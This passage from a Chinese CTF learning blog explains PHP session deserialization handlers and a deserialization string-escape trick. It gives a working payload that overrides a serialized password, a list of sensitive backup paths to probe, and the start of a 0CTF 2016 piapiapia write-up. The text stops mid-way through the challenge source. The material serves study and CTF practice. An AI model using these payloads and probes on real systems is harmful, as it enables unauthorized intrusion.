<h3 id="0x05session反序列化漏洞"><a href="#0x05session反序列化漏洞" class="headerlink" title="0x05session反序列化漏洞"></a>0x05session反序列化漏洞</h3><h4 id="什么是session反序列化"><a href="#什么是session反序列化" class="headerlink" title="什么是session反序列化"></a>什么是session反序列化</h4><p>PHP在session存储和读取时，都会有一个序列化和反序列化的过程，PHP内置了多种处理器用于存储和读取session数据，都会对数据进行序列化和反序列化。<br>在php.ini中有以下配置项：<br><img src="/assets/img/php反序列化总结/php反序列化总结1.jpg"> </p>
<img src="/assets/img/php反序列化总结/php反序列化总结2.jpg">   

<p>其中：<br><code>session.save_path</code>设置session的存储路径<br><code>session.save_handler</code>设置用户自定义存储函数<br><code>session.serialize_handler</code>定义用来序列化/反序列化的处理器名称，主要有：php[默认]，php_serialize，php_binary<br><code>session.auto_start</code>指定会话模块是否在请求开始时启动一个会话<br>php的session内容是以<strong>文件</strong>方式来存储的，由<code>session.save_handler</code>来决定，文件名由<code>sess_sessionid</code>来命名，文件内容则为session序列化后的值。<br>例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">        ini_set(&#39;session.serialize_handler&#39;,&#39;php_serialize&#39;);</span><br><span class="line">        session_start();</span><br><span class="line">        $_SESSION[&#39;name&#39;] &#x3D; &#39;abc&#39;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>执行，随后可以看到结果：<br><img src="/assets/img/php反序列化总结/php反序列化总结3.jpg"><br>发现目录下面多了一个存session的文件，查看它：<br><img src="/assets/img/php反序列化总结/php反序列化总结4.jpg"><br>发现里面存的就是序列化之后的session。<br>上面是存储引擎为<code>php_serialize</code>时的存储结果，如果存储引擎为php，则存储结果为：<br><img src="/assets/img/php反序列化总结/php反序列化总结5.jpg"><br>如果存储引擎为php_binary，则存储结果为：<br><img src="/assets/img/php反序列化总结/php反序列化总结6.jpg"><br>三种处理器的存储格式差异，将会造成在session序列化和反序列化处理器设置不当时的安全隐患。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://su29029.github.io/2020/08/28/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/" data-id="ckedn8mtc000mfcty7g5e6lkp" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag">web安全</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-php反序列化尾部字符串逃逸学习" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/08/28/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B0%BE%E9%83%A8%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0/" class="article-date">
  <time datetime="2020-08-28T02:35:50.000Z" itemprop="datePublished">2020-08-28</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/web/">web</a>►<a class="article-category-link" href="/categories/web/web%E5%AE%89%E5%85%A8/">web安全</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/08/28/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B0%BE%E9%83%A8%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0/">php反序列化尾部字符串逃逸学习</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>发现最近自己刷题比较多，但是缺少总结，感觉这样很有可能刷了一堆题结果知识点都没记住，效率太低。于是决定每天少刷题多总结。</p>
<p>今天总结一下php反序列化的一个问题。来源是2016年0CTF的一道题。</p>
<h2 id="0x00-首先看一下什么是反序列化"><a href="#0x00-首先看一下什么是反序列化" class="headerlink" title="0x00 首先看一下什么是反序列化"></a>0x00 首先看一下什么是反序列化</h2><p>php反序列化，简言之就是将转换为字节序列的对象数据恢复为对象的过程。具体基础知识不再多讲，具体可以参考我的这篇文章<a href="https://su29029.github.io/2020/04/04/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93.html">https://su29029.github.io/2020/04/04/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93.html</a></p>
<h2 id="0x01-php反序列化尾部字符串逃逸"><a href="#0x01-php反序列化尾部字符串逃逸" class="headerlink" title="0x01 php反序列化尾部字符串逃逸"></a>0x01 php反序列化尾部字符串逃逸</h2><p>我们看下面的代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $username = <span class="string">&quot;su29029&quot;</span>;</span><br><span class="line">    $password = <span class="string">&quot;12345&quot;</span>;</span><br><span class="line">    $user = <span class="keyword">array</span>($username, $password);</span><br><span class="line">    $serial = serialize($user);</span><br><span class="line">    var_dump($serial);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">	var_dump(unserialize($serial));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>执行结果如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">string(40) <span class="string">&quot;a:2:&#123;i:0;s:7:&quot;</span>su29029<span class="string">&quot;;i:1;s:5:&quot;</span>12345<span class="string">&quot;;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(7) <span class="string">&quot;su29029&quot;</span></span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(5) <span class="string">&quot;12345&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>反序列化正常返回了一个array对象。如果我们此时在<code>;&#125;</code>后面再加一些内容，例如：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">&#x27;a:2:&#123;i:0;s:7:&quot;su29029&quot;;i:1;s:5:&quot;12345&quot;;&#125;s:5:&quot;admin&quot;;s:5:&quot;hhh&quot;;&#125;&#x27;</span>;</span><br><span class="line">var_dump(unserialize($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>执行结果如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">2</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">7</span>) <span class="string">&quot;su29029&quot;</span></span><br><span class="line">  [<span class="number">1</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;12345&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们发现<code>;&#125;</code>后面的内容被忽略掉了。php底层在作反序列化的时候会根据<code>;</code>来判断字段的分割，以<code>&#125;</code>作为结尾（字符串内的除外），并且会根据长度判断内容。故上面那个例子中<code>&#125;</code>后的内容被忽略掉了。</p>
<p>如果我们设置了一个非正常长度的字节序列呢？例如我们把上面例子中代表字符串长度的数字改一下，会发生什么呢？</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">&#x27;a:2:&#123;i:0;s:9:&quot;su29029&quot;;i:1;s:5:&quot;12345&quot;;&#125;s:5:&quot;admin&quot;;s:5:&quot;hhh&quot;;&#125;&#x27;</span>;</span><br><span class="line">var_dump(unserialize($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>执行结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PHP Notice:  unserialize(): Error at offset 19 of 63 bytes in &#x2F;home&#x2F;php&#x2F;4.php on line 3</span><br><span class="line">bool(false)</span><br></pre></td></tr></table></figure>

<p>我们发现报错了，而且只要标记的字符串长度不等于字符串的真实长度就会报错。</p>
<p>ok，有了以上前置内容，我们来看一个例子，我们需要想办法拿到flag。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$string</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> str_replace(<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;aa&#x27;</span>,$string);</span><br><span class="line">&#125;</span><br><span class="line">        $username=$argv[<span class="number">1</span>];<span class="comment">//read from cmd line  e.g. php 1.php &quot;abc&quot;</span></span><br><span class="line">        $password=<span class="string">&quot;12345&quot;</span>;</span><br><span class="line">        $user = <span class="keyword">array</span>($username, $password);</span><br><span class="line">        $serial = serialize($user);</span><br><span class="line">        var_dump($serial);</span><br><span class="line">        $filt = filter($serial);</span><br><span class="line">        var_dump($filt);</span><br><span class="line">        var_dump(unserialize($filt));</span><br><span class="line">        $res = unserialize($filt);</span><br><span class="line">        <span class="keyword">if</span> ($res[<span class="number">1</span>] === <span class="string">&quot;000000&quot;</span>)&#123; <span class="comment">//$res[1] is password.</span></span><br><span class="line">                <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;failed.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们先随便输入一个字符串：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php 1.php <span class="string">&quot;su29029&quot;</span></span><br></pre></td></tr></table></figure>

<p>执行结果：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">string(40) <span class="string">&quot;a:2:&#123;i:0;s:7:&quot;</span>su29029<span class="string">&quot;;i:1;s:5:&quot;</span>12345<span class="string">&quot;;&#125;&quot;</span></span><br><span class="line">string(40) <span class="string">&quot;a:2:&#123;i:0;s:7:&quot;</span>su29029<span class="string">&quot;;i:1;s:5:&quot;</span>12345<span class="string">&quot;;&#125;&quot;</span></span><br><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(7) <span class="string">&quot;su29029&quot;</span></span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(5) <span class="string">&quot;12345&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">failed.</span><br></pre></td></tr></table></figure>

<p>我们发现反序列化成功。如果我们输入一个会被替换的字符串则会报错：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php 1.php <span class="string">&quot;su29029mmmm&quot;</span></span><br></pre></td></tr></table></figure>

<p>执行结果：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">string(45) <span class="string">&quot;a:2:&#123;i:0;s:11:&quot;</span>su29029mmmm<span class="string">&quot;;i:1;s:5:&quot;</span>12345<span class="string">&quot;;&#125;&quot;</span></span><br><span class="line">string(49) <span class="string">&quot;a:2:&#123;i:0;s:11:&quot;</span>su29029aaaaaaaa<span class="string">&quot;;i:1;s:5:&quot;</span>12345<span class="string">&quot;;&#125;&quot;</span></span><br><span class="line">PHP Notice:  unserialize(): Error at offset 26 of 49 bytes <span class="keyword">in</span> /home/php/1.php on line 13</span><br><span class="line">bool(<span class="literal">false</span>)</span><br><span class="line">PHP Notice:  unserialize(): Error at offset 26 of 49 bytes <span class="keyword">in</span> /home/php/1.php on line 14</span><br><span class="line">PHP Notice:  Trying to access array offset on value of <span class="built_in">type</span> bool <span class="keyword">in</span> /home/php/1.php on line 15</span><br><span class="line">failed.</span><br></pre></td></tr></table></figure>

<p>我们注意到一个细节，被替换后的是序列化后的字符串，替换后字符串边长，但是字符串长度没有变化，s值依然是11，所以报错了。</p>
<p>我们现在换个输入，发现了一些特殊的结果：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php 1.php <span class="string">&quot;su29029mmm\&quot;;&#125;&quot;</span></span><br></pre></td></tr></table></figure>

<p>执行结果有了一些变化：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">string(47) <span class="string">&quot;a:2:&#123;i:0;s:13:&quot;</span>su29029mmm<span class="string">&quot;;&#125;&quot;</span>;i:1;s:5:<span class="string">&quot;12345&quot;</span>;&#125;<span class="string">&quot;</span></span><br><span class="line"><span class="string">string(50) &quot;</span>a:2:&#123;i:0;s:13:<span class="string">&quot;su29029aaaaaa&quot;</span>;&#125;<span class="string">&quot;;i:1;s:5:&quot;</span>12345<span class="string">&quot;;&#125;&quot;</span></span><br><span class="line">PHP Notice:  unserialize(): Unexpected end of serialized data <span class="keyword">in</span> /home/php/1.php on line 13</span><br><span class="line">PHP Notice:  unserialize(): Error at offset 30 of 50 bytes <span class="keyword">in</span> /home/php/1.php on line 13</span><br><span class="line">bool(<span class="literal">false</span>)</span><br><span class="line">PHP Notice:  unserialize(): Unexpected end of serialized data <span class="keyword">in</span> /home/php/1.php on line 14</span><br><span class="line">PHP Notice:  unserialize(): Error at offset 30 of 50 bytes <span class="keyword">in</span> /home/php/1.php on line 14</span><br><span class="line">PHP Notice:  Trying to access array offset on value of <span class="built_in">type</span> bool <span class="keyword">in</span> /home/php/1.php on line 15</span><br><span class="line">failed.</span><br></pre></td></tr></table></figure>

<p>我们发现多了<code>PHP Notice:  unserialize(): Unexpected end of serialized data in /home/php/1.php on line 13</code>，这是为什么呢？我们看替换后的序列化前后的字符串，<code>su29029mmm&quot;;&#125;</code>的长度是13位，而被替换后的字符串<code>su29029aaaaaa</code>也是13位，后面的<code>&quot;;&#125;</code>将字符串闭合了，导致后面的内容失效，反序列化提前结束，而前面的<code>a:2</code>却表明数组长度为2，所以提示“非预期的序列化数据结尾”。</p>
<p>那么这个时候我们就可以想一些“歪招”了，我们构造如下payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php <span class="number">1.</span>php <span class="string">&quot;su29029mmmmmmmmmmmmmmmmmmmm\&quot;;i:1;s:6:\&quot;000000\&quot;;&#125;&quot;</span></span><br></pre></td></tr></table></figure>

<p>我们惊喜的发现成功输出了flag：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">string(81) &quot;a:2:&#123;i:0;s:47:&quot;su29029mmmmmmmmmmmmmmmmmmmm&quot;;i:1;s:6:&quot;000000&quot;;&#125;&quot;;i:1;s:5:&quot;12345&quot;;&#125;&quot;</span><br><span class="line">string(101) &quot;a:2:&#123;i:0;s:47:&quot;su29029aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;;i:1;s:6:&quot;000000&quot;;&#125;&quot;;i:1;s:5:&quot;12345&quot;;&#125;&quot;</span><br><span class="line">array(2) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(47) &quot;su29029aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;</span><br><span class="line">  [1]&#x3D;&gt;</span><br><span class="line">  string(6) &quot;000000&quot;</span><br><span class="line">&#125;</span><br><span class="line">flag&#123;123456&#125;</span><br></pre></td></tr></table></figure>

<p>根据上一个输入，我们发现原理相同，通过<code>&quot;;&#125;</code>闭合序列化字符串，并且巧妙利用替换操作使得替换后的<code>&quot;</code>前的字符串长度刚好等于替换前的全部字符串长度，从而成功的让<code>password</code>变成了<code>000000</code>。</p>
<h2 id="0x02-0CTF-2016-piapiapia-解题思路"><a href="#0x02-0CTF-2016-piapiapia-解题思路" class="headerlink" title="0x02 [0CTF 2016]piapiapia 解题思路"></a>0x02 [0CTF 2016]piapiapia 解题思路</h2><p>首先拿道题是个登录界面，随意输入一下发现无果，f12发现也没有提示，故尝试一些敏感文件。后来发现存在源码泄露<code>www.zip</code>。</p>
<blockquote>
<p>这里简单总结一些敏感目录，拿到题发现没有提示的时候可以尝试访问一下，说不定有意外收获。</p>
<p>/<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a> /html.zip /.git/ /.svn/ /.index.php.swp /index.php.bak /robots.txt /index.phps……</p>
<p>当然还有一些不常见的，一般都会给提示[只是一般…这个不好说]</p>
</blockquote>
<p>拿到<code>www.zip</code>发现了5个文件，逐一查看：</p>
<p>​    index.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	require_once(&#39;class.php&#39;);</span><br><span class="line">	if($_SESSION[&#39;username&#39;]) &#123;</span><br><span class="line">		header(&#39;Location: profile.php&#39;);</span><br><span class="line">		exit;</span><br><span class="line">	&#125;</span><br><span class="line">	if($_POST[&#39;username&#39;] &amp;&amp; $_POST[&#39;password&#39;]) &#123;</span><br><span class="line">		$username &#x3D; $_POST[&#39;username&#39;];</span><br><span class="line">		$password &#x3D; $_POST[&#39;password&#39;];</span><br><span class="line"></span><br><span class="line">		if(strlen($username) &lt; 3 or strlen($username) &gt; 16) </span><br><span class="line">			die(&#39;Invalid user name&#39;);</span><br><span class="line"></span><br><span class="line">		if(strlen($password) &lt; 3 or strlen($password) &gt; 16) </span><br><span class="line">			die(&#39;Invalid password&#39;);</span><br><span class="line"></span><br><span class="line">		if($user-&gt;login($username, $password)) &#123;</span><br><span class="line">			$_SESSION[&#39;username&#39;] &#x3D; $username;</span><br><span class="line">			header(&#39;Location: profile.php&#39;);</span><br><span class="line">			exit;	</span><br><span class="line">		&#125;</span><br><span class="line">		else &#123;</span><br><span class="line">			die(&#39;Invalid user name or password&#39;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	else &#123;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">......[省略html代码]</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>​    class.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span> <span class="keyword">extends</span> <span class="title">mysql</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> $table = <span class="string">&#x27;users&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">is_exists</span>(<span class="params">$username</span>) </span>&#123;</span><br><span class="line">		$username = <span class="built_in">parent</span>::filter($username);</span><br><span class="line"></span><br><span class="line">		$where = <span class="string">&quot;username = &#x27;$username&#x27;&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">parent</span>::select(<span class="keyword">$this</span>-&gt;table, $where);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params">$username, $password</span>) </span>&#123;</span><br><span class="line">		$username = <span class="built_in">parent</span>::filter($username);</span><br><span class="line">		$password = <span class="built_in">parent</span>::filter($password);</span><br><span class="line"></span><br><span class="line">		$key_list = <span class="keyword">Array</span>(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;password&#x27;</span>);</span><br><span class="line">		$value_list = <span class="keyword">Array</span>($username, md5($password));</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">parent</span>::insert(<span class="keyword">$this</span>-&gt;table, $key_list, $value_list);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params">$username, $password</span>) </span>&#123;</span><br><span class="line">		$username = <span class="built_in">parent</span>::filter($username);</span><br><span class="line">		$password = <span class="built_in">parent</span>::filter($password);</span><br><span class="line"></span><br><span class="line">		$where = <span class="string">&quot;username = &#x27;$username&#x27;&quot;</span>;</span><br><span class="line">		$object = <span class="built_in">parent</span>::select(<span class="keyword">$this</span>-&gt;table, $where);</span><br><span class="line">		<span class="keyword">if</span> ($object &amp;&amp; $object-&gt;password === md5($password)) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show_profile</span>(<span class="params">$username</span>) </span>&#123;</span><br><span class="line">		$username = <span class="built_in">parent</span>::filter($username);</span><br><span class="line"></span><br><span class="line">		$where = <span class="string">&quot;username = &#x27;$username&#x27;&quot;</span>;</span><br><span class="line">		$object = <span class="built_in">parent</span>::select(<span class="keyword">$this</span>-&gt;table, $where);</span><br><span class="line">		<span class="keyword">return</span> $object-&gt;profile;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span>(<span class="params">$username, $new_profile</span>) </span>&#123;</span><br><span class="line">		$username = <span class="built_in">parent</span>::filter($username);</span><br><span class="line">		$new_profile = <span class="built_in">parent</span>::filter($new_profile);</span><br><span class="line"></span><br><span class="line">		$where = <span class="string">&quot;username = &#x27;$username&#x27;&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">&#x27;profile&#x27;</span>, $new_profile, $where);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">__class__</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mysql</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> $link = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params">$config</span>) </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;link = mysql_connect(</span><br><span class="line">			$config[<span class="string">&#x27;hostname&#x27;</span>],</span><br><span class="line">			$config[<span class="string">&#x27;username&#x27;</span>], </span><br><span class="line">			$config[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">		);</span><br><span class="line">		mysql_select_db($config[<span class="string">&#x27;database&#x27;</span>]);</span><br><span class="line">		mysql_query(<span class="string">&quot;SET sql_mode=&#x27;strict_all_tables&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;link;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span>(<span class="params">$table, $where, $ret = <span class="string">&#x27;*&#x27;</span></span>) </span>&#123;</span><br><span class="line">		$sql = <span class="string">&quot;SELECT $ret FROM $table WHERE $where&quot;</span>;</span><br><span class="line">		$result = mysql_query($sql, <span class="keyword">$this</span>-&gt;link);</span><br><span class="line">		<span class="keyword">return</span> mysql_fetch_object($result);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span>(<span class="params">$table, $key_list, $value_list</span>) </span>&#123;</span><br><span class="line">		$key = implode(<span class="string">&#x27;,&#x27;</span>, $key_list);</span><br><span class="line">		$value = <span class="string">&#x27;\&#x27;&#x27;</span> . implode(<span class="string">&#x27;\&#x27;,\&#x27;&#x27;</span>, $value_list) . <span class="string">&#x27;\&#x27;&#x27;</span>; </span><br><span class="line">		$sql = <span class="string">&quot;INSERT INTO $table ($key) VALUES ($value)&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> mysql_query($sql);</span><br><span class="line">	&#125;</span><br><span 